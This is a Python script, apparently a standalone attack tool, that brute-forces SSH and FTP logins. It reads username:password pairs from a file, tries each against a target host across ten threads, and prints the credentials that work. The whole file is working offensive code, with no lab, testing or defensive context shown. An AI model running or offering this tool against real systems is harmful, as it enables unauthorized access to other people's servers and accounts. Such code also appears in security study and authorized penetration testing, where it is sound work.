import os
import sys
import threading
import paramiko
import ftplib
from getpass import getpass
from termcolor import colored
import time
from concurrent.futures import ThreadPoolExecutor

def ssh_bruteforce(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username, password)
        print(f'[*] Username: {username}, Password: {password} on {host}:{port}')
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        pass
    except paramiko.SSHException as e:
        print(f'[-] Error connecting to {host}:{port}: {e}')
    return False

def ftp_bruteforce(host, port, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login(user=username, passwd=password)
        print(f'[*] Username: {username}, Password: {password} on {host}:{port}')
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        pass
    except Exception as e:
        print(f'[-] Error connecting to {host}:{port}: {e}')
    return False

def bruteforce_ssh_and_ftp(host, protocol, credentials_file, ports=None):
    print(f'* * * Starting Threaded {protocol} Bruteforce On {host} * * *')

    if ports is None:
        if protocol.lower() == 'ssh':
            ports = [22, 23]
        elif protocol.lower() == 'ftp':
            ports = [21]

    if not os.path.exists(credentials_file):
        print('[!!] That File/Path Does Not Exist')
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=10) as executor:
        for port in ports:
            with open(credentials_file, 'r') as file:
                for line in file.readlines():
                    credentials = line.strip().split(':')
                    if len(credentials) == 2:
                        username, password = credentials
                        if protocol.lower() == 'ssh':
                            executor.submit(ssh_bruteforce, host, port, username, password)
                        elif protocol.lower() == 'ftp':
                            executor.submit(ftp_bruteforce, host, port, username, password)
                        else:
                            print(f'[-] Unknown protocol: {protocol}')
                            sys.exit(1)


